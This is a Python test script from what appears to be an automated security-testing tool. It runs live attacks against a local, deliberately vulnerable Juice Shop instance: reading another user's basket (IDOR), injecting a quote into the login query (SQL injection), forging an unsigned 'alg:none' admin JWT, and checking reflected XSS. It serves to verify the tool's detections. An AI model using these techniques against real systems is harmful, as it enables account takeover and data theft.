"""Phase 5 live check: confirm true-positive findings across multiple vuln classes
against the real sandboxed Juice Shop, using hand-written hypotheses through the
deterministic verifier engine (verifier-first, no LLM needed).

Done-when: >= 4 of 6 vuln classes produce a true positive (08_BUILD_ROADMAP.md).

Classes demonstrated here on Juice Shop: IDOR, SQLI_ERROR, BROKEN_AUTH, XSS_REFLECTED.
SQLI_BLIND (needs a DB with SLEEP, e.g. DVWA/MySQL), PATH_TRAVERSAL (needs an OS-file
read, e.g. DVWA file-inclusion) and SSRF (needs an internal callback listener) are
code-complete + unit-tested but require other infra, so they are reported as N/A here.

Usage:  python scripts/run_phase5_live.py [base_url]
"""
from __future__ import annotations

import asyncio
import base64
import json
import sys
import time
import uuid
from pathlib import Path

import httpx

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
try:
    sys.stdout.reconfigure(encoding="utf-8")
except Exception:
    pass

from core.verifier import broken_auth, idor, sqli, xss  # noqa: E402
from schemas.models import Endpoint, Hypothesis, ParamSchema, Payload  # noqa: E402

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:3000"


def _forge_none_jwt(data: dict) -> str:
    def b64u(b: bytes) -> str:
        return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
    header = b64u(json.dumps({"typ": "JWT", "alg": "none"}).encode())
    payload = b64u(json.dumps({"data": data, "iat": int(time.time()),
                               "exp": int(time.time()) + 3600}).encode())
    return f"{header}.{payload}."


async def _register_and_login(client: httpx.AsyncClient) -> tuple[str, int]:
    email = f"redteam+{uuid.uuid4().hex[:8]}@test.local"
    pw = "Password123!"
    await client.post(f"{BASE}/api/Users/", json={
        "email": email, "password": pw, "passwordRepeat": pw,
        "securityQuestion": {"id": 1}, "securityAnswer": "test"})
    login = await client.post(f"{BASE}/rest/user/login", json={"email": email, "password": pw})
    auth = login.json()["authentication"]
    return auth["token"], int(auth["bid"])


def _ep(url, method="GET", params=None):
    return Endpoint(url=url, method=method, params=params or [], auth_required=True)


async def main() -> int:
    results: dict[str, tuple[bool, str, str]] = {}

    async with httpx.AsyncClient(base_url=BASE, timeout=30) as client:
        token, own_bid = await _register_and_login(client)
        victim = 1 if own_bid != 1 else 2

        # IDOR — read another user's basket.
        h = Hypothesis(vuln_class="IDOR",
                       endpoint=_ep(f"{BASE}/rest/basket/:id",
                                    params=[ParamSchema(name="id", location="path", type="int", sample_value=str(own_bid))]),
                       rationale="numeric basket id with auth", payload=Payload(
                           method="GET", url=f"{BASE}/rest/basket/{victim}", auth_token=token),
                       success_criteria="another user's basket")
        r = await idor.verify(h, client)
        results["IDOR"] = (r.is_exploited, r.confidence, r.notes[:70])

        # SQLI_ERROR — lone quote into the login email breaks the query.
        h = Hypothesis(vuln_class="SQLI_ERROR",
                       endpoint=_ep(f"{BASE}/rest/user/login", "POST"),
                       rationale="login email concatenated into SQL", payload=Payload(
                           method="POST", url=f"{BASE}/rest/user/login",
                           body={"email": "'", "password": "x"}),
                       success_criteria="DB error leaked")
        r = await sqli.verify_error_based(h, client)
        results["SQLI_ERROR"] = (r.is_exploited, r.confidence, (r.evidence.error_signature_matched or "")[:40])

        # BROKEN_AUTH — forged alg:none JWT accepted on a protected endpoint.
        forged = _forge_none_jwt({"id": 1, "email": "admin@juice-sh.op"})
        h = Hypothesis(vuln_class="BROKEN_AUTH",
                       endpoint=_ep(f"{BASE}/rest/basket/1"),
                       rationale="forge unsigned JWT (alg:none) as admin", payload=Payload(
                           method="GET", url=f"{BASE}/rest/basket/1", auth_token=forged),
                       success_criteria="protected endpoint accepts forged token")
        r = await broken_auth.verify(h, client)
        results["BROKEN_AUTH"] = (r.is_exploited, r.confidence, r.notes[:70])

    # XSS — real DOM execution via headless Chromium (own http client not needed).
    h = Hypothesis(vuln_class="XSS_REFLECTED",
                   endpoint=_ep(f"{BASE}/#/search?q="),
                   rationale="search result rendered via bypassSecurityTrustHtml",
                   payload=Payload(method="GET", url=f"{BASE}/#/search?q=xss"),
                   success_criteria="marker executes in the DOM")
    try:
        r = await xss.verify(h)
        results["XSS_REFLECTED"] = (r.is_exploited, r.confidence, r.notes[:60])
    except Exception as exc:  # browser missing or launch failure
        results["XSS_REFLECTED"] = (False, "error", f"{type(exc).__name__}: {exc}"[:60])

    print(f"target: {BASE}\n")
    print(f"{'vuln_class':16} {'exploited':10} {'confidence':14} detail")
    print("-" * 78)
    for cls in ["IDOR", "SQLI_ERROR", "BROKEN_AUTH", "XSS_REFLECTED"]:
        ex, conf, detail = results[cls]
        print(f"{cls:16} {str(ex):10} {conf:14} {detail}")
    for cls in ["SQLI_BLIND", "PATH_TRAVERSAL", "SSRF"]:
        print(f"{cls:16} {'N/A':10} {'-':14} code-complete + unit-tested; needs DVWA/listener")

    confirmed = sum(1 for cls in results if results[cls][0])
    print(f"\nconfirmed true-positive classes: {confirmed} / 6")
    print("RESULT:", f"PASS — {confirmed} classes confirmed (>=4 required)" if confirmed >= 4
          else f"only {confirmed} confirmed (need >=4)")
    return 0 if confirmed >= 4 else 1


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
